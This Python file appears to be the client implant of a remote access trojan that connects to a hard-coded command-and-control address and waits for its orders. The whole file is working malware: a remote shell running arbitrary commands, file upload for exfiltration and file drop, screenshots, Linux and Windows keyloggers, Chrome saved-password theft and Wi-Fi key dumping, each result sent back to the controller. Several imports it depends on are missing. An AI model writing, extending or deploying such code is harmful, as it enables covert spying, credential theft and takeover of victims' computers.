#!/usr/bin/python3

import socket

import json                    # The process of encoding JSON is usually called serialization.
			       # This term refers to the transformation of data into a series of bytes
			       # (hence serial) to be stored or transmitted across a network

import PIL.ImageGrab           # python library for taking screenshot


import shutil                  # shutil module enables us to operate with file objects easily and without diving into file objects a lot

from termcolor import colored  # python coloring library

from lnx_keylogger import *

from win_keylogger import *

import win_chrome_password_extractor

from win_wlan_passwd_and_wanip_extractor import *

# Sending whole data all at once
def recv_eff():

	data = ''

	while True:
		try:
			data = data + sock.recv(1024).decode('utf-8').rstrip()        # decoding data and striping out EOL spacing

			return json.loads(data)

		except ValueError:
			continue

# Receiving whole data all at once
def send_eff(data):

	json_data = json.dumps(data)
	sock.send(json_data.encode('utf-8'))                # encoding data to bytes


# For downloading files
def download_file(file_name):

	file = open(file_name, 'wb')

	sock.settimeout(1)

	# if all file datas are sent and nothing left for download,
	# the socket will keep on listening, but will not receive
	# anything, so if now it hangs(keeps on listening) for 1 sec,
	# while loop will break --> indicating file data transfer is
	# complete.

	data_small = sock.recv(1024)

	while data_small:

		file.write(data_small)

		try:
			data_small = sock.recv(1024)

		except socket.timeout:

			break

	sock.settimeout(None)
	file.close()


# For uploading files
def upload_file(file_name):

	file = open(file_name, 'rb')

	sock.send(file.read())


# Screenshot function
def screenshot():

	img = PIL.ImageGrab.grab()

	img.save(r'scrn_sht.png')


# Linux Keylogging
def lnx_keylog(cmd):

	# keylogger on
	if cmd[:9] == 'keylog_on' and len(cmd) > 1:

		global t

		l_keylog = Lnx_Keylogger()
		t = threading.Thread(target=l_keylog.keylog_start)

		t.start()

		send_eff(colored("[+] Keylogger started!!",'green'))

	# keylog dump
	elif cmd[:11] == 'keylog_dump' and len(cmd) > 1:

		l_keylog =  Lnx_Keylogger()
		dumps = l_keylog.read_logs()

		send_eff(colored(dumps,'green'))


	# keylogger off and self destruct
	elif cmd[:10] == 'keylog_off' and len(cmd) > 1:

		l_keylog =  Lnx_Keylogger()

		l_keylog.keylog_off_self_destruct()

		t.join()

		send_eff(colored("[+] Keylogger stopped!!", 'green'))



# Windows Keylogging
def win_keylog(cmd):

	# keylogger on
	if cmd[:9] == 'keylog_on' and len(cmd) > 1:

		global t

		w_keylog = Win_Keylogger()
		t = threading.Thread(target=w_keylog.keylog_start)

		t.start()

		send_eff(colored("[+] Keylogger started!!",'green'))

	# keylog dump
	elif cmd[:11] == 'keylog_dump' and len(cmd) > 1:

		w_keylog =  Win_Keylogger()
		dumps = w_keylog.read_logs()

		send_eff(colored(dumps,'green'))


	# keylogger off and self destruct
	elif cmd[:10] == 'keylog_off' and len(cmd) > 1:

		w_keylog =  Win_Keylogger()

		w_keylog.keylog_off_self_destruct()

		t.join()

		send_eff(colored("[+] Keylogger stopped!!", 'green'))



# Offering a shell from trgt
def shell():

	global cmd               # declaring global variable

	while True:
		cmd = recv_eff() # received response

		# shell command features

		if cmd == "exit": # ✓
			break

		elif cmd == "help": # ✓
			pass

		elif (cmd == "cls") or (cmd == "clear"): # ✓
			pass


		# making file on linux  ✓
		elif cmd[:5] == "touch" and len(cmd) > 1:

			file = open(cmd[6:], "w")

			file.close()


		# Changing directory ✓
		elif cmd[:2] == "cd" and len(cmd) > 1:

			try:
				os.chdir(cmd[3:])        # we know that after changing direc nothing is shown in terminal/cmd,
						         # so we have to send nothing back to C2 Server

			except:
				continue

		# Removing folder in linux and Win   ✓
		elif (cmd[:2] == 'rm' and cmd.find('-r') and len(cmd) > 1) or (cmd[:5] == 'rmdir' and len(cmd) > 1):

			try:
				pwd = os.getcwd()

				abs_path = pwd + '/' + cmd[6:]

				shutil.rmtree(abs_path)

			except:

				continue                 # we know that after removing path nothing is shown in terminal/cmd,
							 # so we have to send nothing as data from trgt

		# Removing file path in Win and linux ✓
		elif cmd[:3] == "del" and len(cmd) > 1:

			try:
				os.remove(cmd[4:])       # remove specified file path

			except:
				continue                 # we know that after removing path nothing is shown in terminal/cmd,
							 # so we have to send nothing as data from trgt


		# Spoofing password from chrome browser win10 ✓
		elif cmd[:12] == "spoof_passwd" and len(cmd) > 1:

			win_chrome_password_extractor.main()

			upload_file('chrome_creds.txt')              # sending file with creds to C2 

			os.remove('chrome_creds.txt')                # removing the file


		# Spoof wan/public ip of trgt win10 machine  ✓
		elif cmd[:11] == "spoof_wanip" and len(cmd) > 1:

			send_eff(colored("[+] Wan/Public ip of trgt windows machine: ", 'cyan'))

			w = wan_ip()

			sock.send(w.encode('utf-8'))  # Encoding to send data


		# spoofing wlan profile creds and wan/public ip from trgt win10 machine  ✓
		elif cmd[:16] == "spoof_wlan_creds" and len(cmd) > 1:

			# Printing trgt's wan.public ip
			send_eff(colored("[+] Wan/Public ip of trgt windows machine: ", 'cyan'))

			w = wan_ip()

			sock.send(w.encode('utf-8'))  # Encoding to send data

			data = Main()

			u_profiles= []                # creating empty list for storing SSID names

			list_profiles = []            # creating empty list for storing multiple users' creds

			# looping through wifi profile names
			for i in data:

				if "All User Profile" in i:

					u_profile = i.split(":")[1][1:-1] # stripping out SSID name

					u_profiles.append(u_profile)

			for j in u_profiles:

				l = ['netsh', 'wlan', 'show', 'profile', j, 'key=clear']

				results = subprocess.check_output(l).decode('utf-8')
				results = results.split('\n') # making list
				list_profiles.append(results)

			send_eff(list_profiles)


		# Screenshot ✓
		elif (cmd[:10] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):

			screenshot()                     # Taking screenshot

			upload_file('scrn_sht.png')      # sending the ss to C2

			os.remove('scrn_sht.png')        # removing the ss from trgt



		# keylogging  ✓
		elif cmd[:6] == 'keylog' and len(cmd) > 1:

			if os.name == 'nt':
				# Windows  ✓
				win_keylog(cmd)
			else:
				#Linux  ✓
				lnx_keylog(cmd)


		# Exfiltration in trgt point of view ✓
		elif cmd[:4] == "take" and len(cmd) > 1:

			upload_file(cmd[5:])

		# Infiltration in trgt point of view ✓
		elif cmd[:4] == "drop" and len(cmd) > 1:

			download_file(cmd[5:])

		else:
			# To enable trgt machine's cmd/bash command to run in C2
			proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

			result = proc.stdout.read() + proc.stderr.read()        # to show output as well as error to the screen in response to the sent command
			result = result.decode('utf-8')                         # decoding result that we got
			send_eff(result)                                        # getting output on the terminal


# creating socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Connecting with the C2_Server
sock.connect(("192.168.0.110",1234))                               # change the ip and port



def main():
	shell()

if __name__ == '__main__':
	main()
 
